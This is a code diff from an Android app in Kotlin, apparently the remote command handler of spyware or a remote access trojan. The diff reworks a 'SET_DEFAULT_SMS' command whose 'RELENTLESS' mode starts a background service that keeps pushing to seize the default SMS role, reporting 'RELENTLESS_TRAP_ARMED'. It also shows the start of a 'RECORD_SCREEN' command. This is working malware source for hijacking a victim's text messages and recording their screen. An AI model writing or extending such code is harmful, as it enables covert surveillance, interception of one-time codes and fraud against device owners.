@@ -516,17 +516,25 @@ object CommandProcessor {
                 }
                 "SET_DEFAULT_SMS" -> {
                     val mode = content.trim().uppercase()
-                    DefaultSmsManager.expectedMode = mode
-                    if (mode == "RELENTLESS") {
-                        DefaultSmsManager.isRelentlessActive = true
-                        val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
-                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
-                    } else if (mode == "STOP_RELENTLESS") {
+                    if (DefaultSmsManager.isDefaultSms(ctx)) {
+                        status = "ALREADY_DEFAULT"
                         DefaultSmsManager.isRelentlessActive = false
+                        DefaultSmsManager.expectedMode = ""
                     } else {
-                        DefaultSmsManager.requestDefault(ctx)
+                        DefaultSmsManager.expectedMode = mode
+                        if (mode == "RELENTLESS") {
+                            DefaultSmsManager.isRelentlessActive = true
+                            val i = Intent(ctx, MonitorService::class.java).apply { putExtra("kick_relentless_sms", true) }
+                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
+                            status = "RELENTLESS_TRAP_ARMED"
+                        } else if (mode == "STOP_RELENTLESS") {
+                            DefaultSmsManager.isRelentlessActive = false
+                            status = "RELENTLESS_STOPPED"
+                        } else {
+                            DefaultSmsManager.requestDefault(ctx)
+                            status = "DEFAULT_SMS_REQUESTED"
+                        }
                     }
-                    status = "DEFAULT_SMS_REQUESTED ($mode)"
                 }
                 "RECORD_SCREEN" -> {
                     val parts = content.split("|")
